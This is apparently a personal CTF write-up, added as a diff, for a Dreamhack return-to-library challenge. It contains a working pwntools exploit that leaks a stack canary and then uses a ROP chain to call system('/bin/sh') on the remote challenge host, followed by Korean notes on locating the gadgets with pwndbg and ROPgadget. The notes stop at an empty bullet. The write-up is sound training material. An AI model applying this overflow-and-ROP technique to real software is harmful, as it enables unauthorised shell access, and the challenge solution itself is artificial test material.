@@ -1,0 +1,49 @@
+#system-hacking 
+# Payload
+```python
+from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+context.gdb_binary = '/usr/local/bin/pwndbg'
+context.binary = '/home/user/Desktop/Dreamhack/Exploit_ReturnToLibrary/rtl'
+
+# e = ELF(context.binary)# context.log_level = "debug"
+# p = process(context.binary.path)
+p = remote("host3.dreamhack.games", port=10579)
+
+def slog(n, m): return success(": ".join([n, hex(m)]))
+
+payload = b'A'*0x39
+p.sendafter(b'Buf: ', payload)
+p.recvuntil(payload)
+canary = u64(b'\x00' + p.recvn(0x7))
+slog('Canary: ', canary)
+
+plt_system = p64(0x4005d0)
+binsh = p64(0x400874)
+pop_rdi = p64(0x400853) # ROPgadget --binary=./rtl --re "pop rdi"
+ret = p64(0x400596) # ROPgadget --binary=./rtl | grep ": ret"
+
+payload = b'A'*0x38 + p64(canary) + b'B'*0x8
+payload += ret
+payload += pop_rdi
+payload += binsh
+payload += plt_system
+
+pause()
+
+p.sendafter(b'Buf: ', payload)
+p.interactive()
+```
+# 풀이 과정
+- 첫 번째 입력에서 먼저 버퍼 오버플로우를 일으켜서 카나리 값을 유출한다.
+- 두 번째 입력에서 리턴 주소 값을 덮어써야 하는데, 필요한 값은 다음과 같다.
+	- plt 테이블에서 system 함수의 위치
+		- pwndbg에서 plt 명령어를 실행, system@plt 함수의 위치를 가져온다.
+	- `/bin/sh` 문자열의 위치
+		- pwndbg에서 `search /bin/sh` 명령을 실행, 나온 결과 중 실행 가능 영역에 있는 주소를 가져온다.
+	- `pop_rdi` 가젯의 위치
+		- `ROPgadget --binary ./rtl --re "pop rdi"` 명령어로 바이너리에 있는 것 중 해당 정규식 조건을 만족하는 가젯의 위치를 가져온다.
+	- `ret` 가젯의 위치
+		- `ROPgadget --binary ./rtl | grep ": ret"` 명령어로 단일 ret 명령만 있는 가젯의 주소를 가져온다.
+	- 
